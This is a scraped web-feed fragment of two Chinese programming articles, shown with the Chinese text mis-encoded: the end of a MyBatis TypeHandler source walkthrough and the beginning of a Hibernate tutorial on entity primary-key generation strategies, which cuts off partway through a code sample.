<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> TypeHandler&lt;?&gt; getTypeHandler(Class&lt;?&gt; propertyType, String columnName) {
    TypeHandler&lt;?&gt; handler = <span class="hljs-literal">null</span>;
    <span class="hljs-comment">// æ ¹æ®åˆ—åæ‰¾ä¸åˆ°å¯¹åº”çš„TypeHandler</span>
    Map&lt;Class&lt;?&gt;, TypeHandler&lt;?&gt;&gt; columnHandlers = typeHandlerMap.get(columnName);
    <span class="hljs-keyword">if</span> (columnHandlers == <span class="hljs-literal">null</span>) {
        columnHandlers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        typeHandlerMap.put(columnName, columnHandlers);
    } <span class="hljs-keyword">else</span> {
        handler = columnHandlers.get(propertyType);
    }
    <span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">null</span>) {
        <span class="hljs-type">JdbcType</span> <span class="hljs-variable">jdbcType</span> <span class="hljs-operator">=</span> getJdbcType(columnName);
        handler = typeHandlerRegistry.getTypeHandler(propertyType, jdbcType);
      
      <span class="hljs-comment">// çœç•¥ä»£ç </span>
    }
    <span class="hljs-keyword">return</span> handler;
}
</code></pre>
<p>åœ¨è¿™ä¸ªæ–¹æ³•é‡Œé¢ä¼šå…ˆå°è¯•æ ¹æ® <code>jdbcType</code> ä½œä¸º key è·å–å¯¹åº”çš„ <code>TypeHandler</code>ï¼Œä½†æ˜¯è·å–ä¸åˆ°ï¼Œç„¶åå°è¯•æ ¹æ® null ä½œä¸º key è·å–å¯¹åº”çš„ TypeHandlerï¼Œè¿™ä¸ªå®é™…ä¸Šæ˜¯è·å–åˆ°çš„æ˜¯  <code>DateTypeHandler</code> è¿™ä¸ªå¯¹è±¡çš„å®ä¾‹ã€‚ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> &lt;T&gt; TypeHandler&lt;T&gt; <span class="hljs-title function_">getTypeHandler</span><span class="hljs-params">(Type type, JdbcType jdbcType)</span> {
    <span class="hljs-keyword">if</span> (ParamMap.class.equals(type)) {
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
    Map&lt;JdbcType, TypeHandler&lt;?&gt;&gt; jdbcHandlerMap = getJdbcHandlerMap(type);
    TypeHandler&lt;?&gt; handler = <span class="hljs-literal">null</span>;
    <span class="hljs-keyword">if</span> (jdbcHandlerMap != <span class="hljs-literal">null</span>) {
      <span class="hljs-comment">// å…ˆæ ¹æ®jdbcTypeä½œä¸ºkeyè·å–å¯¹åº”çš„TypeHandler</span>
        handler = jdbcHandlerMap.get(jdbcType);
        <span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// æ ¹æ®nullä½œä¸ºkeyè·å–ï¼Œè¿™é‡Œä¼šè·å–åˆ°DateTypeHandler</span>
            handler = jdbcHandlerMap.get(<span class="hljs-literal">null</span>);
        }
        <span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// #591</span>
            handler = pickSoleHandler(jdbcHandlerMap);
        }
    }
    <span class="hljs-comment">// type drives generics here</span>
    <span class="hljs-keyword">return</span> (TypeHandler&lt;T&gt;) handler;
}
</code></pre>
<p>è€Œ <code>DateTypeHandler</code> åˆ™æ˜¯åœ¨ <code>TypeHandlerRegistry</code> çš„æ„é€ å‡½æ•°é‡Œé¢æ³¨å†Œçš„ï¼Œæ³¨å†Œçš„æ—¶å€™æ°å¥½æ˜¯ null ä½œä¸º key çš„ã€‚ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">TypeHandlerRegistry</span><span class="hljs-params">(Configuration configuration)</span> {
    <span class="hljs-built_in">this</span>.unknownTypeHandler = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnknownTypeHandler</span>(configuration);
    <span class="hljs-comment">// çœç•¥å…¶å®ƒä»£ç </span>
    register(Date.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">DateTypeHandler</span>());
    register(JdbcType.TIMESTAMP, <span class="hljs-keyword">new</span> <span class="hljs-title class_">DateTypeHandler</span>());
}

<span class="hljs-keyword">private</span> &lt;T&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">register</span><span class="hljs-params">(Type javaType, TypeHandler&lt;? extends T&gt; typeHandler)</span> {
    <span class="hljs-type">MappedJdbcTypes</span> <span class="hljs-variable">mappedJdbcTypes</span> <span class="hljs-operator">=</span> typeHandler.getClass().getAnnotation(MappedJdbcTypes.class);
    <span class="hljs-keyword">if</span> (mappedJdbcTypes != <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">for</span> (JdbcType handledJdbcType : mappedJdbcTypes.value()) {
            register(javaType, handledJdbcType, typeHandler);
        }
        <span class="hljs-keyword">if</span> (mappedJdbcTypes.includeNullJdbcType()) {
            register(javaType, <span class="hljs-literal">null</span>, typeHandler);
        }
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// è¿™é‡Œæ³¨å†Œäº†keyä¸ºnullçš„DateTypeHandler</span>
        register(javaType, <span class="hljs-literal">null</span>, typeHandler);
    }
}
</code></pre>
<p>åœ¨æœ¬æ¡ˆä¾‹ä¸­ <code>DateTypeHandler</code> çš„ <code>getNullableResult()</code> æ–¹æ³•ä¸­ä¼ å…¥çš„åˆ—åæ˜¯ <code>name</code>ï¼Œç„¶åè°ƒç”¨ <code>ResultSet</code> çš„ <code>getTimestamp()</code> æ–¹æ³•è·å– <code>Timestamp</code> ç±»å‹çš„å®ä¾‹ï¼Œå› ä¸ºå®é™…ä¸Šè¿™ä¸ªåˆ—çš„å€¼æ˜¯ <code>Jone</code> ï¼Œå½“ç„¶æ˜¯è½¬ä¸æˆ <code>Timestamp</code> ç±»å‹çš„ï¼Œå› æ­¤æŠ¥é”™äº†ã€‚ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> Date <span class="hljs-title function_">getNullableResult</span><span class="hljs-params">(ResultSet rs, String columnName)</span>
      <span class="hljs-keyword">throws</span> SQLException {
    <span class="hljs-type">Timestamp</span> <span class="hljs-variable">sqlTimestamp</span> <span class="hljs-operator">=</span> rs.getTimestamp(columnName);
    <span class="hljs-keyword">if</span> (sqlTimestamp != <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(sqlTimestamp.getTime());
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
}
</code></pre>
<p>å½“å»æ‰ <code>@Builder</code> æ³¨è§£æ—¶ï¼Œä½¿ç”¨çš„æ„é€ å‡½æ•°å°±æ˜¯æ— å‚æ„é€ å‡½æ•°ï¼Œç›´æ¥é€šè¿‡æ— å‚æ„é€ å‡½æ•°å°±åˆ›å»ºå¯¹è±¡äº†ï¼Œè‡ªç„¶å°±ä¸éœ€è¦æŒ‰ç…§æ„é€ å‚æ•°ä¸‹æ ‡å°†åˆ—è½¬ä¸ºå¯¹åº”çš„æ„é€ å‚æ•°ç±»å‹äº†ã€‚ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">createResultObject</span><span class="hljs-params">(ResultSetWrapper rsw, ResultMap resultMap, List&lt;Class&lt;?&gt;&gt; constructorArgTypes, List&lt;Object&gt; constructorArgs, String columnPrefix)</span>
    <span class="hljs-keyword">throws</span> SQLException {
    <span class="hljs-keyword">final</span> Class&lt;?&gt; resultType = resultMap.getType();
    <span class="hljs-keyword">final</span> <span class="hljs-type">MetaClass</span> <span class="hljs-variable">metaType</span> <span class="hljs-operator">=</span> MetaClass.forClass(resultType, reflectorFactory);
    <span class="hljs-keyword">final</span> List&lt;ResultMapping&gt; constructorMappings = resultMap.getConstructorResultMappings();
    <span class="hljs-keyword">if</span> (hasTypeHandlerForResultObject(rsw, resultType)) {
        <span class="hljs-keyword">return</span> createPrimitiveResultObject(rsw, resultMap, columnPrefix);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!constructorMappings.isEmpty()) {
        <span class="hljs-keyword">return</span> createParameterizedResultObject(rsw, resultType, constructorMappings, constructorArgTypes, constructorArgs, columnPrefix);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (resultType.isInterface() || metaType.hasDefaultConstructor()) { <span class="hljs-comment">// å¦‚æœæœ‰æ— å‚æ„é€ å‡½æ•°ç›´æ¥èµ°è¿™é‡Œå°±åˆ›å»ºå¯¹è±¡äº†</span>
        <span class="hljs-keyword">return</span> objectFactory.create(resultType);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (shouldApplyAutomaticMappings(resultMap, <span class="hljs-literal">false</span>)) {
        <span class="hljs-keyword">return</span> createByConstructorSignature(rsw, resultMap, columnPrefix, resultType, constructorArgTypes, constructorArgs);
    }
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExecutorException</span>(<span class="hljs-string">"Do not know how to create an instance of "</span> + resultType);
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernateï¼ˆ15ï¼‰Hibernateä¸­å¦‚ä½•å®šä¹‰ä¸€ä¸ªå®ä½“çš„ä¸»é”®ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7589838714450591785</link>    <guid>https://juejin.cn/post/7589838714450591785</guid>    <pubDate>2025-12-31T23:06:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589838714450591785" data-draft-id="7589839433320792127" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernateï¼ˆ15ï¼‰Hibernateä¸­å¦‚ä½•å®šä¹‰ä¸€ä¸ªå®ä½“çš„ä¸»é”®ï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-31T23:06:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernateï¼ˆ15ï¼‰Hibernateä¸­å¦‚ä½•å®šä¹‰ä¸€ä¸ªå®ä½“çš„ä¸»é”®ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-31T23:06:43.000Z" title="Wed Dec 31 2025 23:06:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-31
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨Hibernateä¸­ï¼Œå®šä¹‰å®ä½“çš„ä¸»é”®æ˜¯éå¸¸é‡è¦çš„æ­¥éª¤ã€‚ä¸»é”®ç”¨äºå”¯ä¸€æ ‡è¯†æ•°æ®åº“è¡¨ä¸­çš„æ¯ä¸€è¡Œè®°å½•ã€‚æˆ‘ä»¬é€šå¸¸ä½¿ç”¨æ³¨è§£æ¥å®šä¹‰å®ä½“çš„ä¸»é”®ã€‚</p>
<p>ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„æ³¨è§£æ¥å®šä¹‰å®ä½“çš„ä¸»é”®ï¼š</p>
<ol>
<li><code>@Id</code>ï¼šæ ‡è®°å­—æ®µä¸ºå®ä½“çš„ä¸»é”®ã€‚</li>
<li><code>@GeneratedValue</code>ï¼šæŒ‡å®šä¸»é”®çš„ç”Ÿæˆç­–ç•¥ã€‚</li>
<li><code>@Column</code>ï¼šæŒ‡å®šæ•°æ®åº“è¡¨ä¸­åˆ—çš„è¯¦ç»†ä¿¡æ¯ã€‚</li>
</ol>
<h3 data-id="heading-0">ä¸»é”®ç”Ÿæˆç­–ç•¥</h3>
<p><code>@GeneratedValue</code>æ³¨è§£æœ‰å‡ ç§å¸¸ç”¨çš„ç”Ÿæˆç­–ç•¥ï¼š</p>
<ol>
<li><strong>AUTO</strong>ï¼šé»˜è®¤ç­–ç•¥ï¼ŒJPAæä¾›çš„ä¸»é”®ç”Ÿæˆæ–¹å¼ï¼Œä¾æ®åº•å±‚æ•°æ®åº“çš„ä¸åŒè‡ªåŠ¨é€‰æ‹©åˆé€‚çš„ç”Ÿæˆç­–ç•¥ã€‚</li>
<li><strong>IDENTITY</strong>ï¼šé‡‡ç”¨æ•°æ®åº“çš„è‡ªå¢é•¿å­—æ®µï¼Œå¦‚MySQLçš„AUTO_INCREMENTã€‚</li>
<li><strong>SEQUENCE</strong>ï¼šä½¿ç”¨æ•°æ®åº“çš„åºåˆ—ï¼Œä¸»è¦é€‚ç”¨äºOracleæ•°æ®åº“ã€‚</li>
<li><strong>TABLE</strong>ï¼šé€šè¿‡ä¸€å¼ è¡¨æ¥ç”Ÿæˆä¸»é”®ï¼Œè¯¥è¡¨é€šå¸¸ç”¨äºæ¨¡æ‹Ÿåºåˆ—ã€‚</li>
</ol>
<h3 data-id="heading-1">ç¤ºä¾‹ä»£ç </h3>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªå®Œæ•´çš„ç¤ºä¾‹ï¼Œé€šè¿‡ä¸åŒçš„ç”Ÿæˆç­–ç•¥æ¥å®šä¹‰å®ä½“çš„ä¸»é”®ã€‚</p>
<h4 data-id="heading-2">é…ç½®æ–‡ä»¶ <code>hibernate.cfg.xml</code></h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- æ•°æ®åº“è¿æ¥é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate å±æ€§é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- æ˜ å°„ç±»é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Student"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-3">HibernateUtil ç±»</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateUtil</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// ä»é…ç½®æ–‡ä»¶åˆ›å»ºSessionFactory</span>
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            <span class="hljs-comment">// è®°å½•å¯åŠ¨å¤±è´¥çš„é”™è¯¯</span>
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SessionFactory <span class="hljs-title function_">getSessionFactory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> sessionFactory;
    }
}
</code></pre>
<h4 data-id="heading-4">å®ä½“ç±» Student</h4>
<h5 data-id="heading-5">ä½¿ç”¨ AUTO ç”Ÿæˆç­–ç•¥</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.Entity;
<span class="hljs-keyword">import</span> javax.persistence.GeneratedValue;
<span class="hljs-keyword">import</span> javax.persistence.GenerationType;
<span class="hljs-keyword">import</span> javax.persistence.Id;

<span class="hljs-meta">@Entity</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.AUTO)</span>
    <span class="hljs-keyword">private</span> Long id;
    
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.name = name;
        <span class="hljs-built_in">this</span>.age = age;
    }

    <span class="hljs-comment">// getters å’Œ setters</span>
    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> age;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.age = age;
    }
}
</code></pre>
<h5 data-id="heading-6">ä½¿ç”¨ IDENTITY ç”Ÿæˆç­–ç•¥</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.Entity;
<span class="hljs-keyword">import</span> javax.persistence.GeneratedValue;
<span class="hljs-keyword">import</span> javax.persistence.GenerationType;
<span class="hljs-keyword">import</span> javax.persistence.Id;

<span class="hljs-meta">@Entity</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;
    
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.name = name;
        <span class="hljs-built_in">this</span>.age = age;
    }

    <span class="hljs-comment">// getters å’Œ setters</span>
    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> age;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.age = age;
    }
}
</code></pre>
<h5 data-id="heading-7">ä½¿ç”¨ SEQUENCE ç”Ÿæˆç­–ç•¥</h5>
<p>å¦‚æœä½¿ç”¨SEQUENCEç­–ç•¥ï¼Œéœ€è¦åœ¨æ•°æ®åº“ä¸­åˆ›å»ºä¸€ä¸ªåºåˆ—ã€‚</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> SEQUENCE student_seq <span class="hljs-keyword">START</span> <span class="hljs-keyword">WITH</span> <span class="hljs-number">1</span> INCREMENT <span class="hljs-keyword">BY</span> <span class="hljs-number">1</span>;
</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.Entity;
<span class="hljs-keyword">import</span> javax.persistence.GeneratedValue;
<span class="hljs-keyword">import</span> javax.persistence.GenerationType;
